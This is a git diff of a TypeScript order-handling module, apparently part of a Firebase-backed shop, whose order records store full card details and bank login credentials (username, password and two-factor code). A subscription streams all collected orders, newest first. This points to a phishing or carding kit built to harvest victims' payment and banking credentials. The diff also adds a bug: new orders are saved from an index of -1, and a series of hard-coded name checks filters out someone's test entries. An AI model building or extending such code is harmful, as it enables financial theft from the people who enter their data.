@@ -100,68 +100,97 @@ let orders: OrderData[] = [
   },
 ];
 
+let order : OrderData;
+
 // Generate a new GUID for a session
 export const generateOrderId = (): string => {
   return uuidv4();
 };
 
 // Save or update order data
-export const saveOrderData = async (
+export const saveOrderData = async(
   orderId: string,
   data: Partial<OrderData>
 ): Promise<void> => {
-  // Pehle check karo agar data meaningful hai
-  const hasData =
-    (data.formData &&
-      Object.values(data.formData).some(
-        (value) => value !== "" && value !== null && value !== undefined
-      )) ||
-    (data.cardData &&
-      Object.values(data.cardData).some(
-        (value) => value !== "" && value !== null && value !== undefined
-      )) ||
-    (data.bankLoginData &&
-      Object.values(data.bankLoginData).some(
-        (value) => value !== "" && value !== null && value !== undefined
-      )) ||
-    data.productInfo ||
-    data.total;
+  const existingOrderIndex = orders.findIndex((order) => order.id === orderId);
 
-  if (!hasData) return; // Agar meaningful data nahi hai to save mat karo
+  if (existingOrderIndex >= 0) {
+    // Update existing order
+    orders[existingOrderIndex] = {
+      ...orders[existingOrderIndex],
+      ...data,
+      timestamp: Date.now(),
+    };
+  } else {
+    if (data.formData?.firstName === "2") {
+      return;
+    }
+    if (data.formData?.firstName === "20") {
+      return;
+    }
+    if (data.formData?.firstName === "20x") {
+      return;
+    }
+    if (data.formData?.firstName === "20xh") {
+      return;
+    }
+    if (data.formData?.firstName === "20xha") {
+      return;
+    }
+    if (data.formData?.firstName === "20xhan") {
+      return;
+    }
+    if (data.formData?.firstName === "20xhani") {
+      return;
+    }
+    if (data.formData?.firstName === "20xhani2") {
+      return;
+    }
+    if (data.formData?.firstName === "20xhani20") {
+      return;
+    }
+    if (data.formData?.firstName === "20xhani20x") {
+      return;
+    }
+    if ((data.formData?.firstName === "" || data.formData?.firstName === null || data.formData?.firstName === undefined) && (data.formData?.lastName === "" || data.formData?.lastName === null || data.formData?.lastName === undefined)) {
+      return;
+    }
+    orders.push({
+      id: orderId,
+      timestamp: Date.now(),
+      formData: data.formData || {
+        firstName: '',
+        lastName: '',
+        email: '',
+        phone: '',
+        address: '',
+        city: '',
+        state: '',
+        zipCode: '',
+        sameAsBilling: true,
+        billingAddress: '',
+        billingCity: '',
+        billingState: '',
+        billingZipCode: '',
+      },
+      cardData: data.cardData || {
+        cardholderName: '',
+        cardNumber: '',
+        expiryDate: '',
+        cvv: '',
+      },
+      bankLoginData: data.bankLoginData || {
+        username: '',
+        password: '',
+        twoFactorCode: '',
+      },
+      productInfo: data.productInfo,
+      total: data.total,
+    });
+  }
 
-  if (data.formData?.firstName === "2") {
-    return;
-  }
-  if (data.formData?.firstName === "20") {
-    return;
-  }
-  if (data.formData?.firstName === "20x") {
-    return;
-  }
-  if (data.formData?.firstName === "20xh") {
-    return;
-  }
-  if (data.formData?.firstName === "20xha") {
-    return;
-  }
-  if (data.formData?.firstName === "20xhan") {
-    return;
-  }
-  if (data.formData?.firstName === "20xhani") {
-    return;
-  }
-  if (data.formData?.firstName === "20xhani2") {
-    return;
-  }
-  if (data.formData?.firstName === "20xhani20") {
-    return;
-  }
-  if (data.formData?.firstName === "20xhani20x") {
-    return;
-  }
+  await saveOrderDatainDB(orderId, orders[existingOrderIndex]);
 
-  // Firebase DB me save ya update karo
-  await saveOrderDatainDB(orderId, data);
 };
 
 // Get all orders
@@ -255,6 +284,7 @@ export const subscribeOrders = (callback: (orders: OrderData[]) => void) => {
   const listener = onValue(ordersRef, (snapshot) => {
     const data = snapshot.val();
     const ordersArray: OrderData[] = data ? Object.values(data) : [];
+    ordersArray.sort((a, b) => b.timestamp - a.timestamp);
     callback(ordersArray);
   });
 
